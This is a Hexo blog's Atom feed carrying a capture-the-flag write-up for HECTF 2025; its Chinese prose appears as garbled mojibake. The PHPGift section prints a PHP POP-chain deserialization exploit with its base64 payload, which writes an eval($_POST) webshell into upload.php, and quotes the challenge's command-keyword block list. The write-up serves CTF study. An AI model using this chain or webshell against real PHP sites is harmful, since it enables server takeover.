<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>goldençš„éƒ¨è½é˜</title>
  
  <subtitle>subtitleå†™å¾—çœŸå¥½</subtitle>
  <link href="http://blog.g01den.top/atom.xml" rel="self"/>
  
  <link href="http://blog.g01den.top/"/>
  <updated>2026-02-05T09:34:59.554Z</updated>
  <id>http://blog.g01den.top/</id>
  
  <author>
    <name>g01den</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€2025ã€‘HECTF</title>
    <link href="http://blog.g01den.top/posts/215f7d8b.html"/>
    <id>http://blog.g01den.top/posts/215f7d8b.html</id>
    <published>2026-02-05T09:24:52.000Z</published>
    <updated>2026-02-05T09:34:59.554Z</updated>
    
    <content type="html"><![CDATA[<pre><code>ç¬¬ä¸€å¤©æ‰“å¾—å¤´ç–¼çœ¼ç›ç–¼ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¢«è„‘æ´ç»™å¹²çƒ‚äº†ï¼Œç»“æœæ˜¯tmæ„Ÿå†’äº†ï¼Œå›å»åƒä¸ªè¯ç§’å¥½äº†ï¼Œä½†æ˜¯è„‘æ´å¤ªéš¾èšŒäº†ï¼Œç¬¬äºŒå¤©æ‰“èˆèŒå»äº†ï¼Œæ²¡è§£åé¢çš„é¢˜äº†ï¼Œä¸è¿‡å¹¸å¥½æ²¡çœ‹ï¼Œåé¢æœ‰äº›é¢˜è¿˜çœŸä¸å¤§å¥½å†™ã€‚</code></pre><h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Webï¼š</h1><h2 id="è€çˆ·çˆ·çš„é‡‘å—"><a class="markdownIt-Anchor" href="#è€çˆ·çˆ·çš„é‡‘å—">#</a> <strong>è€çˆ·çˆ·çš„é‡‘å—</strong></h2><blockquote><p>ç°åœ¨ä¸çŸ¥ä¸è§‰ 2025 å¹´äº†ï¼Œæ›¾ç»åœ¨ 4399 é‡Œé¨æ¸¸çš„å°å­©å„¿ä¹Ÿå˜æˆå¤§äººäº†â€¦ é‡æ–°çœ‹äº†ä¸€é 4399 çš„ç»å…¸æ¸¸æˆï¼Œæƒ³èµ·äº†è¿™ä¸ªåŠªåŠ›æŒ–çŸ¿çš„è€çˆ·çˆ·ã€‚ ä¸‹è½½é™„ä»¶ï¼Œæ‰“å¼€ exeï¼Œé‡æ¸©ç«¥å¹´çš„ä¹è¶£ï¼</p><p><strong>æç¤º 1</strong>1. è¯·æ³¨æ„è·å¾—çš„ flag ç¬¬å…­æ®µå‰é¢æœ‰ä¸€ä¸ªç©ºæ ¼å“¦ï½</p></blockquote><p>â€‹ æ‰“å¼€æ˜¯ä¸ªæ¸¸æˆï¼Œæ‰“å®Œå°±æœ‰ flagï¼Œå½“ç„¶åˆ†æ•°è¦è¿‡ 1000<br><img data-src="https://i-blog.csdnimg.cn/direct/761a2f79d1814c4e8f2c958d2bd43b70.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¦å¤–ä¸€ä¸ªæƒ³æ³•ï¼Œå°±æ˜¯ï¼Œæµè§ˆæ–‡ä»¶ï¼Œå‘ç° bk_flag.png ç­‰å¤šä¸ªå›¾ç‰‡ï¼Œwinhex æ‰“å¼€ï¼Œæœç´¢ flagï¼Œä¸çŸ¥é“ä¸ºå•¥ IDA é‡Œæ²¡æœ‰ï¼Œæ‰¾åˆ°äº†è¿™ä¸ªï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/51c9a624a8184b109669b285687065f2.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æŠŠè¿™ä¸ªäº¤ä¸Šå»çœ‹çœ‹ï¼ŒæˆåŠŸã€‚</p><h2 id="phpgift"><a class="markdownIt-Anchor" href="#phpgift">#</a> <strong>PHPGift</strong></h2><p>â€‹ctrl+u çœ‹åˆ°ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hhhhhh!!!! where is xxx.php --&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æç¤ºæ˜¯ä¸‰å­—æ–‡ä»¶ï¼Œflag ä¸Šé¢æœ‰ä¸ª ser æ˜¯å”¯ä¸€ä¸‰å­—ç¬¦çš„è¯»è¯»çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/7513e1f76e20416796b6959d6edd04ec.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fileHandle</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fileName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fileName</span> = <span class="string">&#x27;data.txt&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileName = <span class="variable">$fileName</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileHandle = <span class="title function_ invoke__">fopen</span>(<span class="variable">$fileName</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fileHandle) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;fileHandle);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fileName; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$settings</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;settings[<span class="variable">$key</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;settings[<span class="variable">$key</span>] = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySessionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sessionId</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionId = <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;sess_&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$userData</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;params) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;data) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data) === <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cacheDir</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ttl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dir</span> = <span class="string">&#x27;/tmp/cache&#x27;</span>, <span class="variable">$ttl</span> = <span class="number">3600</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cacheDir = <span class="variable">$dir</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ttl = <span class="variable">$ttl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;[Cache] Destroyed manager for <span class="subst">&#123;$this-&gt;cacheDir&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logFile</span> = <span class="string">&#x27;app.log&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$logFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setLogFile</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logFile, <span class="variable">$message</span> . PHP_EOL, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="variable">$msg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserProfile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User: <span class="subst">&#123;$this-&gt;name&#125;</span> (<span class="subst">&#123;$this-&gt;email&#125;</span>)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$factor</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$x</span> * <span class="variable language_">$this</span>-&gt;factor; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|sh|exec|system|passthru|`|eval|assert/i&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker?\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹pop é“¾ã€‚</p><p>â€‹é“¾å­æ€è·¯å¤§æ¦‚æ˜¯ <code>Logger</code>  ä¸­çš„ <code>__invoke</code> ï¼Œè§¦å‘ä¹‹åè°ƒç”¨ <code>log</code>  è¿›è¡Œä»»æ„æ–‡ä»¶å†™ï¼Œåœ¨è¿™é‡Œå†™å…¥æœ¨é©¬å³å¯ï¼Œé‚£ä¹ˆè°ƒç”¨ <code>__invoke</code>  çš„ç‚¹å¯ä»¥æ˜¯ <code>User</code>  ä¸­çš„ <code>call_user_func</code> ï¼Œ <code>__toString</code>  å¯ä»¥ç”± <code>FileHandler</code>  ä¸­çš„ <code>echo $this-&gt;fileName; </code> è§¦å‘ï¼Œå†å‘ä¸Šå°±æ˜¯ <code>__destruct</code> ï¼Œå…¶ä»–æ‚ä¸ƒæ‚å…«çš„ç±»å’Œæ–¹æ³•å¤ªå¤šäº†ï¼Œçœ‹ä¸Šå»è¿™ä¸ªé¢˜éš¾ï¼Œç»“æœä¸€çœ‹å¥½åƒä¸éš¾ï¼Œç”Ÿæˆ payload å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fileHandle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fileName</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userData</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span> = <span class="string">&#x27;&lt;? eval($_POST[1]) ?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>=<span class="string">&quot;upload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fileName = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fileName-&gt;data = [<span class="variable">$logger</span>,<span class="string">&quot;__invoke&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#TzoxMToiRmlsZUhhbmRsZXIiOjI6e3M6MTA6ImZpbGVIYW5kbGUiO047czo4OiJmaWxlTmFtZSI7Tzo0OiJVc2VyIjozOntzOjg6InVzZXJEYXRhIjtOO3M6NDoiZGF0YSI7YToyOntpOjA7Tzo2OiJMb2dnZXIiOjE6e3M6NzoibG9nRmlsZSI7czoxMDoidXBsb2FkLnBocCI7fWk6MTtzOjg6Il9faW52b2tlIjt9czo2OiJwYXJhbXMiO3M6MjE6Ijw/IGV2YWwoJF9QT1NUWzFdKSA/PiI7fX0=</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—® <code>upload.php</code>  æ‹¿åˆ° shellï¼Œä¼ å‚æ˜¯ 1ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/641775d3f4a948c7bb1421efb6a55750.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹base64 è§£ç å¾—åˆ°ï¼š <code>HECTF&#123;c0ngr4ts_l1ttl3_h4ck3r_y0u_f0und_my_53cr3t_g1ft&#125;</code></p><h2 id="åƒç´ å‹‡è€…å’Œç¥ç§˜å®è—"><a class="markdownIt-Anchor" href="#åƒç´ å‹‡è€…å’Œç¥ç§˜å®è—">#</a> <strong>åƒç´ å‹‡è€…å’Œç¥ç§˜å®è—</strong></h2><p>â€‹ä¸‰ä¸ªé—¨ï¼Œæœ‰ç”¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> courage = <span class="number">0</span>; <span class="comment">// åˆå§‹å‹‡æ°”å€¼</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">updateDisplay</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;courage-display&#x27;</span>).<span class="property">textContent</span> = courage;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">buyPotion</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            courage += <span class="number">50</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">door</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (door === <span class="string">&#x27;A&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (courage &lt; <span class="number">10000</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;âš ï¸ å‹‡æ°”ä¸è¶³ï¼éœ€è¦è‡³å°‘ 10000 ç‚¹æ‰èƒ½æŒ‘æˆ˜ Door Aï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// æ‰£é™¤ 5000 å‹‡æ°”</span></span></span><br><span class="line"><span class="language-javascript">                courage -= <span class="number">5000</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&#x27;/enter&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: <span class="string">`door=<span class="subst">$&#123;door&#125;</span>&amp;courage=<span class="subst">$&#123;courage&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">msg</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (data.<span class="property">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;/victory?flag=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(data.<span class="property">flag</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&#x27;è¯·æ±‚å¤±è´¥&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    A: ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿæˆ‘ä»¬æ˜¯ä¸æ˜¯å¥½å…„å¼Ÿï¼Œä½ èƒŒç€æˆ‘å·å·æ‰“ä»€ä¹ˆæ¯”èµ›ï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line"><span class="comment">    B: æ²¡æœ‰å•¦ï¼Œä½ è¦æ‰“å—ï¼ŒHECTFï¼Œæ¥ç©å§ã€‚</span></span><br><span class="line"><span class="comment">    A: å¯ä»¥å•Šï¼å¤Ÿå…„å¼Ÿçš„ï¼ŒHECTFæ˜¯å¤§å†™è¿˜æ˜¯å°å†™ï¼Œæˆ‘å»æœæœã€‚</span></span><br><span class="line"><span class="comment">    B: 